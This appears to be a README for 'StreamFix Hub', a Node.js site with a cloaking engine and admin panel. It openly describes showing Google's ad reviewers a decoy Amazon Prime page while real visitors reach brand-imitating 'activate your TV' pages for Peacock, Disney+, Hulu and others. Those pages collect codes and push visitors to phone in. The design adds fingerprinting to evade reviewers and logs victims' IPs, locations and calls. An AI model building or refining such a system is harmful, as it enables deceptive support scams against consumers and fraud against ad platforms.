# StreamFix Hub — Digital Streaming Support (FILTER Admin)

## Overview
A streaming support website with a self-hosted cloaking engine, lead capture system, and secure admin panel. Presents as an independent streaming technical support service. Runs Google Ads to generate leads while cloaking Google's review bots to a safe Amazon Prime page and blocking competitor click fraud.

The admin panel is rebranded as **FILTER** — a full SaaS-style UI with a collapsible left sidebar, section routing, canvas charts (donut + bar), live SSE feed, per-site management, timezone support, and toast notifications.

**Design system**: Light-default theme with dark mode toggle. Blue (#3b82f6) as the primary accent. White/gray-50 background, white cards with soft shadow. The sidebar uses a blue gradient logo box, gray text with blue active-state left border, account section divider, ChevronsRight collapse button at the bottom. The topbar shows a page title + subtitle, notification bell, moon/sun theme toggle, and user avatar. KPI cards feature a coloured icon box (blue/orange/purple/green) in the header row alongside a trending arrow.

## Architecture
- **Runtime**: Node.js with Express
- **Entry**: `index.js` — all routes and server logic in one file
- **Static files**: `public/` — HTML pages served directly
- **Data storage**: PostgreSQL (primary) with JSON flat-file fallback for local dev
  - When `DATABASE_URL` env var is present, all data is persisted to Postgres (survives Railway redeploys)
  - Tables: `cloaker_logs` (every visitor decision, unlimited), `cloaker_leads` (lead events), `cloaker_kv` (sites + settings as JSONB)
  - JSON files in `data/` are written as a secondary backup and used when no DB is configured
  - On first boot with a fresh DB, existing JSON data is automatically migrated into Postgres
  - **Railway setup**: add a PostgreSQL plugin in the Railway dashboard → Railway auto-sets `DATABASE_URL`

## Key Routes
| Route | Description |
|---|---|
| `/` | Homepage (index.html) |
| `/prime`, `/activate`, `/peacock` | Cloaker entry points — trigger fingerprint check |
| `/amazon-activate` | Code submission landing page (real users) |
| `/amazon-prime` | Safe landing page shown to bots/reviewers |
| `/safe` | Alias safe landing page |
| `/offer` | Offer landing page |
| `/channels` | Main cloaker entry point (Google Ads landing) |
| `/channels-activate` | Offer page shown to real US visitors — "Connect TV Now" code+call page |
| `/not-found` | 404 page (HTTP 404) — shown to non-US/blocked visitors |
| `/peacock-tv`, `/disney-plus`, `/hulu`, `/paramount-plus` | Channel safe pages (cloaked) |
| `/fox-one`, `/fox-nation`, `/fox-sports` | FOX channel safe pages (cloaked) |
| `/espn-plus`, `/espn-unlimited`, `/starz`, `/vizio-tv` | More channel safe pages (cloaked) |
| `/peacock-activate`, `/disney-activate`, `/hulu-activate`, `/paramount-activate` | Channel offer pages |
| `/fox-activate`, `/espn-activate`, `/starz-activate`, `/vizio-activate` | Channel offer pages |
| `/api/cloak` | Self-hosted cloaking engine (POST) — accepts X-Site-Key header |
| `/api/track/lead` | Lead capture endpoint (public POST) — accepts X-Site-Key header |
| `/sites/:siteId/safe` | Hub-hosted safe page for each registered site |
| `/sites/:siteId/money` | Hub-hosted money redirect for each registered site |
| `/{ADMIN_PATH}/login` | Admin login page (ADMIN_PATH env var, default: manage-zx7q2) |
| `/{ADMIN_PATH}` | Admin dashboard (auth required); ?site= for per-site filtering |
| `/{ADMIN_PATH}/logout` | Clears session |
| `/{ADMIN_PATH}/settings` | Saves money/safe URLs for default site (POST, auth required) |
| `/{ADMIN_PATH}/toggle` | Toggles cloaking on/off for default site (POST, auth required) |
| `/{ADMIN_PATH}/sites` | Add new site (POST) |
| `/{ADMIN_PATH}/sites/:id/settings` | Update site settings + re-inject script (POST) |
| `/{ADMIN_PATH}/sites/:id/regenerate-key` | Rotate API key + re-inject (POST) |
| `/{ADMIN_PATH}/sites/:id/delete` | Delete site (POST) |
| `/{ADMIN_PATH}/sites/:id/toggle` | Pause/resume site (POST) |
| `/{ADMIN_PATH}/blocked-ips` | Saves permanently blocked IPs |
| `/{ADMIN_PATH}/allowed-countries` | Saves allowed country filter |
| `/{ADMIN_PATH}/clear-logs` | Clears decision log |
| `/{ADMIN_PATH}/clear-leads` | Clears leads log |
| `/{ADMIN_PATH}/clear-frequency` | Resets in-memory repeat-click tracker |
| `/admin` | Returns 404 (path moved to ADMIN_PATH) |
| `/admin/login` | Returns 404 (path moved to ADMIN_PATH) |

## Cloaking Engine
The `/api/cloak` endpoint:
1. Checks user-agent against a 30+ entry bot blocklist
2. Checks `navigator.webdriver` flag, screen resolution, plugin count
3. Calls ip-api.com free API to detect proxies/VPNs/datacenter IPs
4. Enforces repeat-click blocking (same IP within 24h window)
5. Enforces country allowlist if configured
6. Returns `{ decision: "allow"|"block", url: "..." }` and logs the decision

## Lead Capture
The `/api/track/lead` endpoint:
- **code_submit**: fires from `amazon-activate.html` when a visitor submits their TV code. Captures IP, geo, UTM params, gclid, screen, timezone. Stored in `data/leads.json`.
- **call_click**: fires when the visitor clicks the call button in the success popup. Marks the most recent matching submission (same IP, within 30 min) as `called: true` with a `calledAt` timestamp.
- Both fire-and-forget from the frontend — zero UX impact.

## Admin Panel (FILTER)
- Accessible at `/{ADMIN_PATH}` (default: `/manage-zx7q2`), configured via ADMIN_PATH env var; `/admin` and `/admin/login` return 404
- Protected by session-based auth (bcrypt, 8h cookie)
- Password set via `ADMIN_PASSWORD` environment variable (required — no hardcoded fallback)
- Session secret from `SESSION_SECRET` environment variable (required)
- **FILTER UI** — left sidebar nav, hash-based section routing (#dashboard, #sites, #logs, #leads, #blocked-ips, #settings)
- Dashboard: 5 KPI cards, donut chart (allow/block split), hourly bar chart, live SSE feed, block reasons table, top countries
- Sites: per-site expandable rows with toggle switches, tabbed settings panels (General/Security/Script/Railway), API key copy, rotate/delete
- Logs: searchable/filterable traffic table with quick-block button and country flags
- Leads: leads table with CSV export
- Blocked IPs: dedicated page with per-row Unblock button; "Block IP" input at top
- IP Whitelist: new section (`#whitelisted-ips`) — add IPs that always bypass all filters and see the offer page (for testing your own IP)
- Settings: tabbed (Engine, Security, Blocked IPs, Countries, Integrations, Timezone, Password, Danger Zone)
- **Live feed**: 8-second polling fallback (`/{ADMIN_PATH}/activity-poll`) keeps the dashboard updated even when SSE is buffered; shows toast notifications for each new visitor (green=allow, red=block)
  - Security tab: individual feature toggles (VPN/proxy/datacenter/bot-UA/repeat-click/ISP blocking) + custom ISP keyword textarea
  - Password tab: change admin password with current-password verification
- Timezone: configurable display timezone (default UTC) — saved to session via POST /{ADMIN_PATH}/set-timezone
- New routes: `POST /{ADMIN_PATH}/set-timezone`, `POST /{ADMIN_PATH}/block-ip-ajax`, `POST /{ADMIN_PATH}/unblock-ip-ajax`, `POST /{ADMIN_PATH}/change-password`, `POST /{ADMIN_PATH}/settings/features`

## Environment Variables
| Variable | Purpose |
|---|---|
| `PORT` | Server port (default 5000) |
| `SESSION_SECRET` | Express session signing secret (required) |
| `ADMIN_PASSWORD` | Admin panel password — hashed with bcrypt on startup (required) |
| `ADMIN_PATH` | Secret URL prefix for admin panel (default: manage-zx7q2) — no leading/trailing slashes |
| `GITHUB_TOKEN` | GitHub Personal Access Token (repo scope) — enables auto-inject |
| `RAILWAY_API_TOKEN` | Railway API token — enables deploy monitoring |

## Dependencies
- `express` — web framework
- `express-session` — session management
- `bcryptjs` — password hashing

## Deployment
- Deployed to Railway.com
- Domain: activatemytvcode.com
- `ADMIN_PASSWORD` and `SESSION_SECRET` must be set as Railway environment variables
- Railway uses ephemeral filesystem — `data/` files reset on each deploy
